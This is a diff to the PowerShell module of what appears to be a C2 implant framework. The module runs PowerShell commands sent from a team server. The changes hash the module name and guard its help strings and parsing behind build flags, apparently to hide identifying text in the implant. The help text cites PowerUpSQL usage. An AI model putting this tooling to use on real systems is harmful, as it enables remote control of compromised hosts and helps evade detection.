@@ -11,12 +11,18 @@ using namespace mscorlib;
 
 #endif
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 
-const std::string moduleName = "powershell";
-const std::string ScriptsDirectoryFromTeamServer = "../Scripts/";
+constexpr std::string_view moduleName = "powershell";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
+#ifdef BUILD_TEAMSERVER
+const std::string ScriptsDirectoryFromTeamServer = "../Scripts/";
+#endif
 
 #ifdef _WIN32
 
@@ -166,7 +172,11 @@ HRESULT createHost(const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
 #endif
 
 Powershell::Powershell()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 	m_firstRun=true;
 }
@@ -185,6 +195,7 @@ Powershell::~Powershell()
 std::string Powershell::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "Powershell:\n";
 	info += "Execute a powershell command.\n";
 	info += "To be sure to get the output of the commande do 'cmd | write-output'.\n";
@@ -196,13 +207,14 @@ std::string Powershell::getInfo()
 	info += " - powershell import-module PowerUpSQL.ps1; Get-SQLConnectionObject\n";
 	info += " - powershell -i /tmp/PowerUpSQL.ps1 \n";
 	info += " - powershell -s /tmp/script.ps1 \n";
-
+#endif
 	return info;
 }
 
 
 int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 	if(splitedCmd.size()<2)
 	{
 		c2Message.set_returnvalue(getInfo());
@@ -249,7 +261,7 @@ int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 	c2Message.set_instruction(splitedCmd[0]);
 	c2Message.set_cmd(shellCmd);
-
+#endif
 	return 0;
 }
 
@@ -273,7 +285,7 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 			m_modulesToImport+=finalCmd;
 
 			std::string outCmd = execPowershell(m_modulesToImport);
-			c2RetMessage.set_instruction(m_name);
+			c2RetMessage.set_instruction(c2RetMessage.instruction());
 			c2RetMessage.set_cmd(cmd);
 			c2RetMessage.set_returnvalue(outCmd);
 			return 0;
@@ -288,7 +300,7 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 			finalCmd += "};";
 
 			std::string outCmd = execPowershell(finalCmd);
-			c2RetMessage.set_instruction(m_name);
+			c2RetMessage.set_instruction(c2RetMessage.instruction());
 			c2RetMessage.set_cmd(cmd);
 			c2RetMessage.set_returnvalue(outCmd);
 			return 0;
@@ -300,7 +312,7 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 	std::string outCmd = execPowershell(finalCmd);
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(cmd);
 	c2RetMessage.set_returnvalue(outCmd);
 
